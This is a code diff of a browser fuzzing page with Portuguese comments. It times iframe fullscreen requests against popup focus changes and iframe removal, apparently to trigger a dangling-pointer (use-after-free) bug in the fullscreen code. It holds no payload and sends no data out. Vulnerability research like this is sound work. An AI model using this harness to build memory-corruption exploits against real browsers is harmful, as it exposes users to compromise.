@@ -7,17 +7,19 @@
      height:250px;overflow-y:auto;border:1px solid #ccc;padding:4px"></div>
 <script>
 /*
-  V4 CORRIGIDO: abre o popup UMA VEZ via gesto do usuário.
-  Fuzza o delay entre webkitRequestFullscreen() e iframe.remove()
-  sem precisar reabrir popup a cada iteração.
-  Popup fica aberto durante todas as rodadas.
+  V4 FINAL:
+  - Popup aberto UMA vez via gesto do usuário
+  - A cada iteração: popup.location = 'about:blank' simula
+    o blur/focus sem precisar de novo window.open()
+  - iframe.remove() via setInterval + popup.closed preserva
+    a estrutura exata do teste original
 */
 
-var running  = false;
-var popup    = null;
+var running   = false;
+var popup     = null;
 var iteration = 0;
-var delay1   = 0;    // delay antes do bloco de foco — varia de 0 a 600ms
-var delay2   = 300;  // delay fixo entre foco e popup operações
+var delay1    = 0;    // varia 0 → 600ms
+var delay2    = 300;
 
 function log(msg) {
     var div  = document.getElementById("log");
@@ -30,12 +32,14 @@ function log(msg) {
 function runIteration() {
     if (!running) return;
     if (!popup || popup.closed) {
-        document.getElementById("status").innerHTML = "Popup fechou — stop";
+        document.getElementById("status").innerHTML = "Popup fechou — parado";
         running = false;
         return;
     }
 
     iteration++;
+    document.getElementById("status").innerHTML =
+        "iter=" + iteration + " delay=" + delay1 + "ms";
 
     var iframe = document.createElement("iframe");
     iframe.style.cssText = "width:100px;height:100px";
@@ -51,15 +55,14 @@ function runIteration() {
         if (focusTimer) { clearInterval(focusTimer); focusTimer = null; }
         if (iframe.parentNode) iframe.remove();
 
-        if (iteration % 3 === 0) {
+        if (iteration % 3 === 0)
             delay1 = delay1 >= 600 ? 0 : delay1 + 25;
-        }
+
         if (running) setTimeout(runIteration, 500);
     }
 
-    // Monitora dangling pointer via fullscreenchange
-    document.addEventListener('webkitfullscreenchange', function onFsChange() {
-        document.removeEventListener('webkitfullscreenchange', onFsChange);
+    document.addEventListener('webkitfullscreenchange', function onFsc() {
+        document.removeEventListener('webkitfullscreenchange', onFsc);
         var el = document.webkitFullscreenElement;
         if (el) {
             try {
@@ -84,49 +87,62 @@ function runIteration() {
         iDoc.documentElement.webkitRequestFullscreen();
 
         setTimeout(function() {
-            if (!popup || popup.closed) { finish("popup fechou mid-iter"); return; }
+            if (!popup || popup.closed) { finish("popup já fechou"); return; }
 
             popup.focus();
             window.focus();
             try { iframe.contentWindow.focus(); } catch(e) {}
 
             setTimeout(function() {
-                // Não fecha o popup — só muda foco de volta
-                window.focus();
+                // Navega o popup para about:blank em vez de fechar
+                // dispara blur/pagehide sem destruir a janela
+                // para que possamos reutilizá-la na próxima iteração
+                try { popup.location.href = "about:blank"; } catch(e) {}
 
+                // setInterval idêntico ao original — aguarda navegação
                 focusTimer = setInterval(function() {
-                    clearInterval(focusTimer);
-                    focusTimer = null;
+                    var ready = false;
+                    try {
+                        // Popup pronto quando voltar a about:blank
+                        ready = (popup.location.href === "about:blank" ||
+                                 popup.document.readyState === "complete");
+                    } catch(e) { ready = true; }
 
-                    var fsBefore = document.webkitFullscreenElement;
-                    var preState = fsBefore ? "ACTIVE" : "null";
+                    if (ready) {
+                        clearInterval(focusTimer);
+                        focusTimer = null;
 
-                    iframe.remove();
+                        var fsBefore =
+                            document.webkitFullscreenElement ? "ACTIVE" : "null";
 
-                    setTimeout(function() {
-                        var fsAfter = document.webkitFullscreenElement;
-                        if (fsAfter) {
-                            try {
-                                finish("POST-REMOVE fs ATIVO! tag=" + fsAfter.tagName +
-                                       " w=" + fsAfter.clientWidth +
-                                       " [pre=" + preState + "]");
-                            } catch(e) {
-                                finish("POST-REMOVE EXCEPTION: " + e);
+                        iframe.remove();
+
+                        setTimeout(function() {
+                            var fsAfter = document.webkitFullscreenElement;
+                            if (fsAfter) {
+                                try {
+                                    finish("POST-REMOVE ACTIVE! tag=" +
+                                           fsAfter.tagName + " w=" +
+                                           fsAfter.clientWidth +
+                                           " [pre=" + fsBefore + "]");
+                                } catch(e) {
+                                    finish("POST-REMOVE EX: " + e +
+                                           " [pre=" + fsBefore + "]");
+                                }
+                            } else {
+                                finish("clean [pre=" + fsBefore + "]");
                             }
-                        } else {
-                            finish("clean [pre=" + preState + "]");
-                        }
-                    }, 50);
+                        }, 50);
+                    }
                 }, 20);
             }, delay2);
-        }, delay1);
+        }, delay1 || 50);
     };
 }
 
 document.getElementById("run").onclick = function() {
     if (running) return;
 
-    // Popup aberto via gesto direto do usuário — não será bloqueado
     popup = window.open("", "_blank", "width=400,height=300");
     if (!popup) {
         document.getElementById("status").innerHTML = "Popup bloqueado!";
@@ -135,8 +151,7 @@ document.getElementById("run").onclick = function() {
     popup.document.open();
     popup.document.write(
         '<!DOCTYPE html><html><body>' +
-        '<h3>Popup Fuzzer</h3>' +
-        '<p>Mantém aberto durante o teste</p>' +
+        '<h3>Fuzzer — mantém aberto</h3>' +
         '</body></html>'
     );
     popup.document.close();
@@ -145,7 +160,6 @@ document.getElementById("run").onclick = function() {
     iteration = 0;
     delay1    = 0;
     document.getElementById("log").innerHTML = "";
-    document.getElementById("status").innerHTML = "Running...";
     runIteration();
 };
 
